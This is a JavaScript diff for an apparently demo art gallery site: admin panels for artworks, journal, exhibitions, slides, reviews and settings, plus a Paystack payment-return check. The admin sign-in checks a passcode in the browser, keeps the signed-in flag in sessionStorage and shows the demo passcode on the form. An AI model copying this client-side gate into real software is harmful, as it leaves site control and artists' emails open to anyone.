+var SX=[{k:'t',l:'Exhibition title',r:1},{k:'m',l:'Museum',r:1},{k:'c',l:'City and country',r:1},{k:'cu',l:'Curator',r:1},{k:'s',l:'Opens',t:'date',r:1},{k:'e',l:'Closes',t:'date',r:1},{k:'ar',l:'Artists (comma separated)'}];
+var SS=[{k:'t',l:'Headline',r:1},{k:'s',l:'Text',t:'area'},{k:'b',l:'Button label',r:1},{k:'l',l:'Button goes to',t:'sel',o:['#shop','#journal','#exhibitions','#sell']},{k:'k',l:'Art style',t:'sel',o:['circles','bars','waves','grid']},{k:'c1',l:'Background colour',t:'color'},{k:'c2',l:'Button colour',t:'color'},{k:'c3',l:'Art colour',t:'color'}];
+var SSET=[{k:'name',l:'Company name',r:1},{k:'tag',l:'Tagline'},{k:'foot',l:'Footer text'},{k:'pass',l:'Admin passcode',r:1}];
+var tab='works',edit=null,adminErr='';
+function refresh(keepAdmin){apply();slider();chips();grid();jchips();posts();exs();cart();if(!keepAdmin&&location.hash==='#admin')admin()}
+function crud(key,title,sch,row,fixed){var L=db[key],it=edit!=null?L.filter(function(x){return x.id===edit})[0]:null;
+  var h='<h3>'+title+' ('+L.length+')</h3><div>'+L.map(function(x){var r=row(x);return '<div class="row2"><div><b>'+esc(r[0])+'</b>'+(x.st==='pending'?'<span class="pill">Pending</span>':'')+'<br><span class="mut">'+esc(r[1])+'</span></div><div class="acts">'+(x.st==='pending'?'<button class="btn dark" data-ap="'+x.id+'">Approve</button>':'')+'<button class="btn" data-ed="'+x.id+'">Edit</button>'+(fixed?'':'<button class="btn" data-del="'+x.id+'">Delete</button>')+'</div></div>'}).join('')+'</div>';
+  if(fixed&&!it)return h+'<p class="note">Choose Edit on a slide to change its text, button, link and colours.</p>';
+  return h+'<h3>'+(it?'Edit':'Add new')+'</h3><form id="af" class="af">'+sch.map(function(f){return fld(f,it?it[f.k]:(f.k==='dt'?today():f.k==='st'?'live':f.k==='y'?2026:f.d))}).join('')+'<div><button class="btn dark" type="submit">'+(it?'Save changes':'Add')+'</button>'+(it?' <button class="btn" type="button" data-cancel>Cancel</button>':'')+'</div></form>'}
+function admin(){var el=$('#admin');
+  if(!sessionStorage.getItem('zadm')){el.innerHTML='<h2>Admin</h2><p class="sub">Enter the passcode to manage the site.</p><form id="lg" class="pf" style="max-width:340px"><label>Passcode<input type="password" name="p" required autocomplete="off"></label>'+(adminErr?'<div class="note" role="alert">'+adminErr+'</div>':'')+'<button class="btn dark" type="submit">Sign in</button><p class="mut" style="font-size:13px">Demo passcode: <b>zartz-admin</b></p></form>';
+    $('#lg').onsubmit=function(e){e.preventDefault();if(new FormData(this).get('p')===db.set.pass){sessionStorage.setItem('zadm','1');adminErr=''}else adminErr='Incorrect passcode. Try again.';admin()};return}
+  var pend=db.works.filter(function(w){return w.st==='pending'}).length,T=[['works','Artwork'+(pend?' ('+pend+' pending)':'')],['posts','Journal'],['exs','Exhibitions'],['slides','Slides'],['rev','Reviews'],['set','Site']];
+  var h='<h2>Admin</h2><div class="adtabs" role="tablist">'+T.map(function(t){return '<button role="tab" data-tab="'+t[0]+'" aria-selected="'+(tab===t[0])+'">'+t[1]+'</button>'}).join('')+'<button data-out style="margin-left:auto">Sign out</button></div>';
+  if(tab==='works')h+=crud('works','All artwork',SW,function(w){return[w.t+' – '+w.a,money(w.p)+' · '+w.m+(w.by?' · artist submission':'')]});
+  if(tab==='posts')h+=crud('posts','Curators’ Journal',SP,function(p){return[p.t,fmt(p.dt)+' · '+p.c+' · '+p.g]});
+  if(tab==='exs')h+=crud('exs','Exhibitions',SX,function(x){return[x.t+' at '+x.m,x.c+' · '+fmt(x.s)+' to '+fmt(x.e)]});
+  if(tab==='slides')h+=crud('slides','Homepage slides (7)',SS,function(s){return[s.t,s.b+' → '+s.l]},true);
+  if(tab==='rev')h+='<h3>Reviews ('+db.rev.length+')</h3>'+db.rev.map(function(r,i){var w=wk(r.w);return '<div class="row2"><div><b>'+esc(r.n)+'</b> <span class="st">'+stars(r.r)+'</span> on '+esc(w?w.t:'removed work')+'<br><span class="mut">'+esc(r.t)+'</span></div><button class="btn sm" data-rd="'+i+'">Delete</button></div>'}).join('')+'<h3>Feedback ('+db.fb.length+')</h3>'+db.fb.map(function(r,i){var w=wk(r.w);return '<div class="row2"><div><b>'+esc(r.n)+'</b><span class="tag">'+esc(r.a)+'</span> on '+esc(w?w.t:'removed work')+'<br><span class="mut">'+esc(r.t)+'</span></div><button class="btn sm" data-fd="'+i+'">Delete</button></div>'}).join('')+'<h3>Artist signups ('+db.artists.length+')</h3>'+(db.artists.length?db.artists.map(function(a){return '<div class="row2"><div><b>'+esc(a.name)+'</b> · '+esc(a.country)+'<br><span class="mut">'+esc(a.email)+' · '+esc(a.bio)+'</span></div></div>'}).join(''):'<p class="mut">No artists have signed up yet.</p>');
+  if(tab==='set')h+='<h3>Site settings</h3><form id="af" class="af">'+SSET.map(function(f){return fld(f,db.set[f.k])}).join('')+'<div><button class="btn dark" type="submit">Save settings</button></div></form><h3>Reset</h3><p class="mut">Restore the original demo content. This removes all your changes, reviews and artist submissions.</p><button class="btn" data-reset>Reset demo data</button>';
+  el.innerHTML=h;
+  var f=$('#af');if(f)f.onsubmit=function(e){e.preventDefault();
+    if(tab==='set'){Object.assign(db.set,read(f,SSET));save();refresh(true);admin();return}
+    var sch={works:SW,posts:SP,exs:SX,slides:SS}[tab],o=read(f,sch),L=db[tab];
+    if(edit!=null)Object.assign(L.filter(function(x){return x.id===edit})[0],o);
+    else{o.id=nid();if(tab==='works')o.pal=PALS[o.id%PALS.length];L.push(o)}
+    edit=null;save();refresh(true);admin()}}
+$('#admin').onclick=function(e){var d=e.target.dataset;if(!d)return;
+  var L=db[tab]||[],changed=false;
+  if(d.tab){tab=d.tab;edit=null;admin();return}
+  if(d.out!==undefined){sessionStorage.removeItem('zadm');admin();return}
+  if(d.ed){edit=+d.ed;admin();$('#af').scrollIntoView({block:'center'});return}
+  if(d.cancel!==undefined){edit=null;admin();return}
+  if(d.ap){wk(+d.ap).st='live';changed=true}
+  if(d.del&&confirm('Delete this item? This cannot be undone.')){db[tab]=L.filter(function(x){return x.id!==+d.del});changed=true}
+  if(d.rd){db.rev.splice(+d.rd,1);changed=true}
+  if(d.fd){db.fb.splice(+d.fd,1);changed=true}
+  if(d.reset!==undefined&&confirm('Reset everything to the original demo content?')){var p=db.set.pass;db=seed();db.set.pass=p;changed=true}
+  if(changed){save();refresh(true);admin()}};
+
+/* ---------- payment return ---------- */
+async function verifyReturnedPayment(){
+  var p=new URLSearchParams(location.search),ref=p.get('reference')||p.get('trxref');
+  if(!ref)return;
+  var msg=$('#msg');
+  if(msg)msg.textContent='Verifying Paystack payment…';
+  try{
+    var res=await fetch('/api/paystack/verify?reference='+encodeURIComponent(ref));
+    var data=await res.json();
+    if(data.success&&data.status==='success'){
+      db.cart=[];save();cart();
+      if(msg)msg.textContent='Payment successful. Reference: '+ref;
+      history.replaceState({},document.title,location.pathname+location.hash);
+    }else if(msg){
+      msg.textContent='Payment was not completed. Reference: '+ref;
+    }
+  }catch(e){
+    if(msg)msg.textContent='Payment verification could not be completed yet. Reference: '+ref;
+  }
+}
+
+/* ---------- start ---------- */
+$('#grid').addEventListener('keydown',function(){});
+refresh(true);route();verifyReturnedPayment();
+})();
